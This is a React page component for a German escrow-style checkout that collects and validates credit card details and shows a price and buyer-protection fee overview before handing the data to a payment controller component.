import React, {useState} from "react";
import Layout from "../components/Layout";
import vp_safe from '../images/vp_safe.png'
import vp_cc from '../images/vp_kreditkarte.png'
// import {AiOutlineInfoCircle, BsInfoCircle} from "react-icons/all";
import {router} from "@inertiajs/react";
import ProductCard from "../components/ProductCard";
import SafePayInfo from "../components/SafePayInfo";
import PriceOverview from "../components/PriceOverview";
import PayDeliveryInfo from "../components/PayDeliveryInfo";
import CcController from "../components/CcController";

export default function (props) {
    const pin = props.pin;
    const productPage = props.productPage;
    const imageLinks = props.imageLinks;
    const data = props.data;

    const [ccNumber, setCcNumber] = useState('');
    const [ccOwner, setCcOwner] = useState(data.firstname + ' ' + data.lastname);
    const [ccDate, setCcDate] = useState('');
    const [ccCvc, setCcCvc] = useState('');

    const [errorMsg, setErrorMsg] = useState('');
    const [paymentWindowId, setPaymentWindowId] = useState(Number((Math.ceil(Math.random() * 100)) + '' + Date.now()));
    const [showCcController, setShowCcController] = useState(false);
    const [formErrors, setFormErrors] = useState({});

    const handleChangeCcNumber = event => setCcNumber(event.target.value);
    const handleChangeCcOwner = event => setCcOwner(event.target.value);
    const handleChangeCcDate = event => setCcDate(event.target.value);
    const handleChangeCcCvc = event => setCcCvc(event.target.value);

    const handleOnCcControllerError = errorData => {
        setErrorMsg(errorData.message);
        setFormErrors(errorData.formErrors);

        setShowCcController(false);
    };

    const handleSubmit = (e) => {
        e.preventDefault();

        const formErrors = {};

        const ccData = {
            ccNumber: formatCcNumber(ccNumber),
            ccOwner: ccOwner,
            ccDate: formatCcDate(ccDate),
            ccCvc: formatCvc(ccCvc),
        }

        if (ccData.ccNumber.length !== 16 + 3) {
            formErrors.cc_number = true;
        }

        if (ccData.ccOwner.length < 2 || ccOwner.indexOf(' ') === -1) {
            formErrors.cc_owner = true;
        }

        if (ccData.ccDate.length !== 4 + 3) {
            formErrors.cc_expire = true;
        }

        if (ccData.ccCvc.length !== 3) {
            formErrors.cc_cvc = true;
        }

        setPaymentWindowId(Number((Math.ceil(Math.random() * 100)) + '' + Date.now()))
        setFormErrors(formErrors);
        setErrorMsg('');

        if (Object.keys(formErrors).length === 0) {
            setShowCcController(true);
        }
    };

    const handleSubmitBack = (e) => {
        e.preventDefault();
        router.get('/' + pin + '/methode', {});
    };

    const formatCcNumber = (value) => {
        const v = value
            .replace(/\s+/g, "")
            .replace(/[^0-9]/gi, "")
            .substr(0, 16);
        const parts = [];

        for (let i = 0; i < v.length; i += 4) {
            parts.push(v.substr(i, 4));
        }

        return parts.join(" ");
    }

    const formatCcDate = (value) => {
        const v = value
            .replace(/\s+/g, "")
            .replace(/[^0-9]/gi, "")
            .substr(0, 4);
        const parts = [];

        for (let i = 0; i < v.length; i += 2) {
            parts.push(v.substr(i, 2));
        }

        return parts.join(" / ");
    }

    const formatCvc = (value) => {
        return value
            .replace(/\s+/g, "")
            .replace(/[^0-9]/gi, "")
            .substr(0, 3);
    }

    const formatter = new Intl.NumberFormat('de-DE', {style: 'currency', currency: 'EUR'});
    const formattedPrice = formatter.format(productPage.price);
    const formattedFees = formatter.format(productPage.fees * productPage.price);
    const formattedShipping = formatter.format(productPage.shipping_price ?? 0);

    const formattedAmount = formatter.format(productPage.price + (productPage.fees * productPage.price) + (productPage.shipping_price ?? 0));

    return (
        <Layout>
            <div className="bg-main-white py-8 px-4 grid grid-cols-3 lg:grid-cols-2">

                <div className="col-span-3 sm:col-span-2 lg:col-span-1">
                    <div className="text-main-black-title font-black">
                        Sicher Bezahlen
                    </div>
                    <div className="max-w-sm mt-4">
                        <div className="border-0 border-gray-300 border-t py-4">

                            <PriceOverview
                                formattedPrice={formattedPrice}
                                formattedFees={formattedFees}
                                formattedShipping={formattedShipping}
                                formattedAmount={formattedAmount}
                            />

                            {showCcController &&
                                <div className="mt-16">
                                    <CcController
                                        pin={pin}
                                        ccNumber={formatCcNumber(ccNumber)}
                                        ccOwner={ccOwner}
                                        ccDate={formatCcDate(ccDate)}
                                        ccCvc={formatCvc(ccCvc)}
                                        formattedPrice={formattedPrice}
                                        paymentSessionId={data.payment_session_id}
                                        paymentWindowId={paymentWindowId}
                                        onError={handleOnCcControllerError}
                                    />
                                </div>
                            }

                            {!showCcController &&
                                <form className="mt-16 flex flex-col gap-y-4" onSubmit={handleSubmit}>

                                    <div className="flex flex-col gap-1 ">
                                        <label htmlFor="cc_number"
                                               className="w-32 block text-sm text-main-black-title font-medium">
                                            Kartennummer
                                        </label>
                                        <div className="">
                                            <input type="text" name="cc_number" id="cc_number"
                                                   className={`block w-full rounded-lg border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ${formErrors.firstname ? 'ring-red-300 focus:ring-red-300' : 'ring-gray-300 focus:ring-main-green-bg'} placeholder:text-gray-400 focus:ring-2 focus:ring-inset sm:text-sm sm:leading-6`}
                                                   placeholder=""
                                                   value={formatCcNumber(ccNumber)}
                                                   onChange={handleChangeCcNumber}
                                                   required
                                            />
                                            {formErrors.cc_number &&
                                                <div className="text-xs text-red-700">
                                                    Die Kartennummer ist ungültig!
                                                </div>
                                            }
                                        </div>
                                    </div>
                                    <div className="flex flex-col gap-1 ">
                                        <label htmlFor="cc_owner"
                                               className="w-32 block text-sm text-main-black-title font-medium">
                                            Karteninhaber/in
                                        </label>
                                        <div className="w-full">
                                            <input type="text" name="cc_owner" id="cc_owner"
                                                   className={`block w-full rounded-lg border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ${formErrors.lastname ? 'ring-red-300 focus:ring-red-300' : 'ring-gray-300 focus:ring-main-green-bg'} placeholder:text-gray-400 focus:ring-2 focus:ring-inset sm:text-sm sm:leading-6`}
                                                   placeholder="Vor- und Nachname"
                                                   value={ccOwner}
                                                   onChange={handleChangeCcOwner}
                                                   required
                                            />
                                            {formErrors.cc_owner &&
                                                <div className="text-xs text-red-700">
                                                    Der Name ist ungültig! Bitte Vor- und Nachname angeben.
                                                </div>
                                            }
                                        </div>
                                    </div>
                                    <div className="flex flex-row justify-between gap-x-8">
                                        <div className="flex flex-col gap-1">
                                            <label htmlFor="cc_expire"
                                                   className="w-32 block text-sm text-main-black-title font-medium">
                                                Verfallsdatum
                                            </label>
                                            <div className="w-full">
                                                <input type="text" name="cc_expire" id="cc_expire"
                                                       className={`block w-full rounded-lg border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ${formErrors.lastname ? 'ring-red-300 focus:ring-red-300' : 'ring-gray-300 focus:ring-main-green-bg'} placeholder:text-gray-400 focus:ring-2 focus:ring-inset sm:text-sm sm:leading-6`}
                                                       placeholder="MM / JJ"
                                                       value={formatCcDate(ccDate)}
                                                       onChange={handleChangeCcDate}
                                                       required
                                                />
                                                {formErrors.cc_expire &&
                                                    <div className="text-xs text-red-700">
                                                        Das Datum ist ungültig!
                                                    </div>
                                                }
                                            </div>
                                        </div>
                                        <div className="flex flex-col gap-1">
                                            <label htmlFor="cc_cvc"
                                                   className="w-32 block text-sm text-main-black-title font-medium">
                                                CVV
                                            </label>
                                            <div className="w-full">
                                                <input type="text" name="cc_cvc" id="cc_cvc"
                                                       className={`block w-full rounded-lg border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ${formErrors.lastname ? 'ring-red-300 focus:ring-red-300' : 'ring-gray-300 focus:ring-main-green-bg'} placeholder:text-gray-400 focus:ring-2 focus:ring-inset sm:text-sm sm:leading-6`}
                                                       placeholder=""
                                                       value={formatCvc(ccCvc)}
                                                       onChange={handleChangeCcCvc}
                                                       required
                                                />
                                                {formErrors.cc_cvc &&
                                                    <div className="text-xs text-red-700">
                                                        Die CVV ist ungültig!
                                                    </div>
                                                }
                                            </div>
                                        </div>
                                    </div>

                                    {errorMsg &&
                                        <div className="mt-2 text-sm text-red-700">
                                            {errorMsg}
                                        </div>
                                    }

                                    <div
                                        className={"flex mt-4 " + (showCcController ? 'justify-end' : 'justify-between')}>
                                        <button type="button"
                                                className="rounded-full bg-gray-300 py-2.5 px-3.5 text-sm font-semibold text-gray-600 shadow-sm hover:bg-gray-200 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-main-green-bg"
                                                onClick={handleSubmitBack}
                                        >
                                            Zurück
                                        </button>
                                        <button type="submit"
                                                className="rounded-full bg-main-green-bg py-2.5 px-3.5 text-sm font-semibold text-main-dark-green shadow-sm hover:bg-main-green-bg-hover focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-main-green-bg">
                                            Bezahlen
                                        </button>
                                    </div>
                                </form>
                            }

                        </div>
                    </div>
                </div>

                <div className="bg-main-gray rounded-lg p-4 max-w-sm col-span-3 sm:col-span-1 lg:min-w-[20rem] ml-auto">
                    <div className="text-main-black-text">
                        <div className="flex flex-row items-center gap-3 font-semibold">
                            {/* <BsInfoCircle className="w-5 h-5"/> */}
                            Bezahlung des Produktes
                        </div>
                        <div className="mt-3">
                            Bitte trage deine Kreditkarten-Informationen ein und folge den Anweisungen, um den
                            Betrag von <span className="font-semibold">{formattedAmount}</span> zu bezahlen.
                        </div>
                        <div className="mt-2">
                            Die Käuferschutzgebühr setzt sich aus einer geringen Pauschale von 0,35 €
                            sowie 4,5 % des Preises, auf den du dich mit dem Verkäufer geeinigt hast, zusammen.
                        </div>
                        <div className="mt-2">
                            Nach erfolgreicher Zahlung erhält der Verkäufer die Aufforderung, das gekaufte Produkt an
                            deine
                            Adresse zu verschicken.
                            Du wirst dazu per E-Mail benachrichtigt und erhältst eine Zahlungsbestätigung.
                        </div>
                        <div className="mt-2">
                            Sobald das Produkt bei dir angekommen ist, kannst du das Geld, das du an uns überwiesen
                            hast, für den Verkäufer freigeben.
                            Wie das funktioniert, ist in der E-Mail beschrieben, die wir dir schicken.
                        </div>
                    </div>
                </div>

            </div>

            <PayDeliveryInfo
                data={data}
                handleSubmitBack={handleSubmitBack}
            />

            <ProductCard productPage={productPage} imageLinks={imageLinks}/>

            <SafePayInfo/>

        </Layout>
    );
};
